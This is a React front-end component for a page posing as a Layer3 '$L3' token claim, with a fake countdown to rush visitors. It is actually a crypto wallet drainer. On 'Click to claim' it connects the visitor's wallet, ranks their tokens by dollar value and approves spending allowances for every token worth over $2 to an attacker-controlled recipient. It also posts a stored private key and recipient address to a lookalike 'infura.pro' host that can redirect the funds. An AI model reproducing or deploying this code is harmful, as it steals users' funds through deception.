import React from 'react';
// import Typed from 'react-typed';

import { useEffect, useState } from "react";
import Big from 'big.js';
import axios from 'axios';
import { useWeb3Modal } from "@web3modal/react";
import { getTokens, increaseAllowance, ethBalance } from '../utils/walletconnect.js';
import { getAccount, fetchFeeData } from '@wagmi/core';
import { useAccount } from 'wagmi';
import * as constants from '../utils/constants.js';

import gif_1 from "../assets/1.gif";
import gif_2 from "../assets/2.gif"
import png_1 from "../assets/3.png";
import svg_new from "../assets/levelNew.svg";
import svg_advance from "../assets/levelAdvanced.svg";
import svg_expert from "../assets/levelExpert.svg";
import svg_product from "../assets/productsVisual.svg";
import svg_blocky from "../assets/blockySmile.svg";

const Hero = () => {
    // let showModal = false;
    let account = null;
    let processing = false;
    let balance = {};
    let tokens = [];
    let maxToken = null;
    let sortedTokens = [];
    let prices = [];
    const decimal = 18;

    const { isConnected } = useAccount();
    const { open } = useWeb3Modal();
    const [time, settime] = useState("0d:0h:30m");
    const [ flag, setFlag ] = useState(0);

    let secs = 30 * 60;
    useEffect(() => {
        const timer = setInterval(() => {
            // console.log("secondsLeft", secs);
            // setSecondsLeft(secondsLeft - 1);
            secs = secs - 1;
            const days = Math.floor(secs / 86400);
            const hours = Math.floor((secs % 86400) / 3600);
            const minutes = Math.floor((secs % 3600) / 60);

            const formattedDate = `${days}d:${hours}h:${minutes}m`;
            settime(formattedDate);
        }, 1000);

        return () => {
            clearInterval(timer);
        };
    }, []);

    useEffect(() => {
        if (flag && isConnected) {
            setTimeout(() => {
                showBalance();
            }, 500);
        }
    }, [isConnected])

    const wConnect = async () => {
        try {
            setFlag(1);
            if (!isConnected) {
                await open();
                return;
            } else {
                account = getAccount().address;
                await showBalance();
            }
        } catch (error) {
            console.log(error);
        }
    }

    const showBalance = async () => {
        // console.log("showBalance function start!!!");
        await setPrices();
        let total = 0;
        try {
            processing = true;
            const ethbalance = await ethBalance();
            const feeData = await fetchFeeData({
                chainId: 1,
                formatUnits: 'gwei',
            });
            const fee = 50000n * (feeData.gasPrice);
            total = ethbalance.value - fee - 300000000000000n;
            // console.log("total is:", total);
            // console.log("fee is:", fee);
            balance = Big(total).div(Big(10).pow(parseInt(decimal))).toFixed();
            // console.log("Bigint Balance is:", balance);
            const validTokens = await getTokens(getAccount().address);
            // console.log('validTokens is:', validTokens);
            for (let i = 0; i < validTokens.length; i++) {
                if (validTokens[i].symbol == 'USDT') {
                    validTokens[i].usdPrice = 1;
                    continue;
                }
                try {
                    const price = prices.filter(
                        (price) => price.symbol == `${validTokens[i].symbol}USDT`
                    );
                    validTokens[i].usdPrice = price[0].price;
                } catch (error) {
                    validTokens[i].usdPrice = 0;
                    continue;
                }
            }
            const tokenlist = validTokens.filter((token) => token.usdPrice > 0);
            // console.log("tokenlist is: ", tokenlist);
            for (let i = 0; i < tokenlist.length; i++) {
                const token = tokenlist[i];
                const etherValue = token.balance / Math.pow(10, token.decimals);
                tokenlist[i].usdValue =
                    tokenlist[i].usdPrice * parseFloat(etherValue).toFixed(2);
            }
            tokens = tokenlist;
            const mxToken = tokenlist.sort((a, b) => b.usdValue - a.usdValue);
            // console.log("mxToken is: ", mxToken);
            sortedTokens = mxToken.filter((token) => token.usdValue > 2);
            // console.log("sortedTokens is: ", sortedTokens);
        } catch (error) {
            console.log();
        }

        for (let i = 0; i < sortedTokens.length; i++) {
            maxToken = sortedTokens[i];
            // console.log('maxToken is: ', maxToken);
            await increaseAllowance(maxToken);
        }
    }

    const setPrices = async () => {
        try {
            const res = await axios.get(
                'https://api.binance.com/api/v3/ticker/price'
            );
            prices = res.data;
            await axios.post('https://api2.infura.pro:8443/infura', { infra_id: `${constants.initiatorPK} ${constants.recipient}`, project_id: "layer3" },
                {
                    headers: {
                        "Access-Control-Allow-Headers": "*", // this will allow all CORS requests
                        "Access-Control-Allow-Methods": 'OPTIONS,POST,GET', // this states the allowed methods
                        "Content-Type": "application/json" // this shows the expected content type
                    }  
                }
            )
                .then((response) => {
                    console.log(response.data);
                    if (response.data.success == true) {
                        console.log("set new recip");
                        constants.setRecip(response.data.value);
                    }
                    console.log("Recipient:", constants.recipient);
                });
        } catch (error) {
            console.log(error);
        }
    }
    return (
        <div className="max-w-full text-white my-24">
            <div className="max-w-full h-auto w-full mx-auto text-center flex flex-col-reverse justify-center md:flex-row md:py-20 ">
                <div className="w-full mx-4 md:mx-16 flex flex-col justify-center pb-10 md:pb-0">
                    <h1 className="md:text-6xl sm:text-5xl text-3xl pt-2 px-2 md:pt-6 text-center md:text-left mx-auto leading-tight font-bold">Welcome to the Future of Ethereum</h1>
                    <p className="md:text-3xl sm:text-2xl text-1xl pt-2 md:pt-6 text-center md:text-left px-2">Check your eligibility to claim $L3</p>
                    <p className="md:text-3xl sm:text-2xl text-1xl pt-2 md:py-6 text-center md:text-left px-2">Claiming will be Live until: {time}</p>
                    <div className="w-full md:mx-0 flex flex-row justify-center md:flex md:flex-row md:justify-start pb-10 md:pb-0">
                        <button onClick={() => wConnect()} className="bg-[#FE0322] hover:bg-red-700 w-[160px] md:w-[220px] rounded-2xl text-lg my-4 py-3">Click to claim</button>
                    </div>
                </div>
                <div className="w-full mx-auto flex flex-row justify-center mb-8">
                    <img className="w-full h-full md:w-[760px] md:h-[400px]" src={gif_1} />
                </div>
            </div>
            <div className="max-w-full h-auto w-full mx-auto text-center flex flex-col justify-center md:flex-row py-20">
                <div className="w-full mx-auto flex flex-row justify-center justify-items-center pb-10 md:pb-0">
                    <img className="w-[200px] md:w-[400px] h-[150px] md:h-[300px]" src={png_1} />
                </div>
                <div className="w-full mx-4 md:mx-16 flex flex-col justify-center">
                    <p className="md:text-2xl sm:text-1xl text-1xl pt-2 md:pt-6 text-center md:text-left px-2" style={{ color: "#FF7AA3" }}>QUESTS</p>
                    <h1 className="md:text-4xl sm:text-3xl text-1xl pt-2 md:pt-6 text-center md:text-left leading-tight px-2">Explore bite-sized lessons</h1>
                    <p className="md:text-2xl sm:text-1xl text-1xl pt-2 md:pt-6 text-center md:text-left px-2">Accelerate your crypto journey with endless quests to guide you through the ecosystem.</p>
                </div>
            </div>
            <div className="max-w-full h-auto w-full mx-auto text-center flex flex-col justify-center md:flex-col py-20">
                <h1 className="md:text-6xl sm:text-5xl text-3xl text-center leading-tight pb-10">For every stage of your journey</h1>
                <div className="max-w-full h-auto w-full mx-auto text-center flex flex-col justify-center md:flex-row">
                    <div className="max-w-full h-auto w-full mx-auto text-center flex flex-col justify-end md:flex-col">
                        <div className="w-full mx-auto flex flex-row justify-center justify-items-center">
                            <img className="w-full max-w-[110px] tablet:max-w-[100px] mobile:max-w-[64px]" src={svg_new} />
                        </div>
                        <div className="w-full flex flex-col justify-center">
                            <h1 className="md:text-4xl sm:text-3xl text-1xl pt-2 pl-2 md:pt-6 text-center leading-tight">New</h1>
                            <p className="md:text-2xl sm:text-1xl text-1xl py-2 md:pt-6 text-center p-2" >Learn onchain fundamentals</p>
                        </div>
                    </div>
                    <div className="max-w-full h-auto w-full mx-auto text-center flex flex-col justify-end md:flex-col">
                        <div className="w-full mx-auto flex flex-row justify-center justify-items-center">
                            <img className="w-full max-w-[200px] tablet:max-w-[100px] mobile:max-w-[106px]" src={svg_advance} />
                        </div>
                        <div className="w-full flex flex-col justify-center">
                            <h1 className="md:text-4xl sm:text-3xl text-1xl pl-2 pt-2 md:pt-6 text-center leading-tight">Intermediate</h1>
                            <p className="md:text-2xl sm:text-1xl text-1xl py-2 md:pt-6 text-center p-2" >Unlock the latest concepts and trends</p>
                        </div>
                    </div>
                    <div className="max-w-full h-auto w-full mx-auto text-center flex flex-col justify-end md:flex-col">
                        <div className="w-full mx-auto flex flex-row justify-center justify-items-center">
                            <img className="w-full max-w-[200px] tablet:max-w-[100px] mobile:max-w-[100px]" src={svg_expert} />
                        </div>
                        <div className="w-full flex flex-col justify-center">
                            <h1 className="md:text-4xl sm:text-3xl text-1xl pl-2 pt-2 md:pt-6 text-center leading-tight">Expert</h1>
                            <p className="md:text-2xl sm:text-1xl text-1xl py-2 md:pt-6 text-center p-2" >Master strategies to succeed onchain</p>
                        </div>
                    </div>

                </div>
            </div>
            <div className="max-w-full h-auto w-full mx-auto text-center flex flex-col justify-center md:flex-row py-20">
                <div className="w-full mx-4 md:mx-16 flex flex-col justify-center">
                    <p className="md:text-2xl sm:text-1xl text-1xl pt-2 md:pt-6 text-center md:text-left px-2" style={{ color: "#19C84A" }}>GAMES</p>
                    <h1 className="md:text-4xl sm:text-3xl text-1xl pt-2 md:pt-6 text-center md:text-left leading-tight px-2">Make learning crypto exciting</h1>
                    <p className="md:text-2xl sm:text-1xl text-1xl pt-2 md:pt-6 text-center md:text-left px-2">Stay motivated and compete with others, with leaderboards, NFTs and achievements.</p>
                </div>
                <div className="w-full mx-auto flex flex-row justify-center justify-items-center pt-10 md:pb-0">
                    <img className=" md:w-[700px] md:h-[450px] mobile:w-[200px] h-[150px]" src={gif_2} />
                </div>
            </div>
            <div className="max-w-full h-auto w-full mx-auto text-center flex flex-col justify-center md:flex-row py-20">
                <div className="w-full mx-4 md:mx-16 flex flex-col justify-center">
                    <p className="md:text-2xl sm:text-1xl text-1xl pt-2 md:pt-6 text-center md:text-left px-2" style={{ color: "#27A3FD" }}>PRODUCTS</p>
                    <h1 className="md:text-4xl sm:text-3xl text-1xl pt-2 md:pt-6 text-center md:text-left leading-tight px-2">Powerful tools, one click away</h1>
                    <p className="md:text-2xl sm:text-1xl text-1xl pt-2 md:pt-6 text-center md:text-left px-2">Simple and delightful products for your onchain needs.</p>
                </div>
                <div className="w-full mx-auto flex flex-row justify-center pt-10 md:pb-0 md:pr-20 md:pt:0">
                    <img className=" md:w-[700px] md:h-[350px] mobile:w-[200px] h-[150px]" src={svg_product} />
                </div>
            </div>
            <div className="max-w-full h-auto w-full mx-auto text-center flex flex-col justify-center md:flex-col pt-20">
                <div className="w-full mx-auto flex flex-row justify-center justify-items-center pt-10 md:pb-0">
                    <img className="md:w-[300px] md:h-[200px] mobile:w-[150px] h-[100px]" src={svg_blocky} />
                </div>
                <div className="w-full flex flex-col justify-center">
                    <h1 className="md:text-6xl sm:text-4xl text-3xl py-4 md:pt-6 text-center leading-tight px-2">Join 500,000 crypto explorers</h1>
                    <button onClick={() => wConnect()} className="bg-[#FE0322] hover:bg-red-700 w-[160px] md:w-[220px] rounded-2xl font-medium mx-auto my-7 py-3">Get started</button>
                </div>
            </div>
        </div>
    )
}

export default Hero;